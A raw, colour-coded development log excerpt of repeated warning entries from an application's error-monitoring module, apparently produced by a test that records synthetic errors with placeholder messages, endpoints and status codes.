WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.932125Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m91[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4538'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_38[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m538[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.932173Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m91[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4539'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_39[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m539[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.932220Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m91[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4540'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_40[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m540[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.932269Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m91[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4541'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_41[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m541[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.932317Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m91[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4542'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_42[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m542[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.932365Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m91[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4543'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_43[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m543[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.932413Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m91[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4544'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_44[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m544[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.932460Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m91[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4545'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_45[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m545[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.932507Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m91[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4546'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_46[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m546[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.932555Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m91[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4547'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_47[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m547[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.932602Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m91[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4548'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_48[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m548[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.932649Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m91[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4549'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_49[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m549[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.932697Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m92[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4550'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_50[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m550[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.932744Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m92[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4551'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_51[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m551[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.932794Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m92[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4552'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_52[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m552[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.932844Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m92[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4553'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_53[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m553[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.932892Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m92[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4554'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_54[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m554[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.932940Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m92[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4555'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_55[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m555[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.932988Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m92[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4556'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_56[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m556[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.933036Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m92[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4557'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_57[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m557[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.933112Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m92[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4558'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_58[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m558[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.933196Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m92[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4559'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_59[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m559[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.933255Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m92[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4560'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_60[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m560[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.933308Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m92[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4561'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_61[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m561[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.933358Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m92[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4562'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_62[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m562[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.933407Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m92[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4563'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_63[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m563[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.933459Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m92[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4564'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_64[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m564[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.933508Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m92[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4565'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_65[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m565[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.933557Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m92[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4566'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_66[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m566[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.933605Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m92[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4567'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_67[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m567[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.933653Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m92[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4568'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_68[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m568[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.933700Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m92[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4569'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_69[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m569[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.933748Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m92[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4570'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_70[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m570[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.933795Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m92[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4571'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_71[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m571[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.933842Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m92[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4572'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_72[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m572[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.933894Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m92[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4573'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_73[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m573[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.933942Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m92[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4574'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_74[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m574[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.933991Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m92[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4575'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_75[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m575[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.934039Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m92[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4576'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_76[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m576[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.934086Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m92[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4577'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_77[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m577[0m
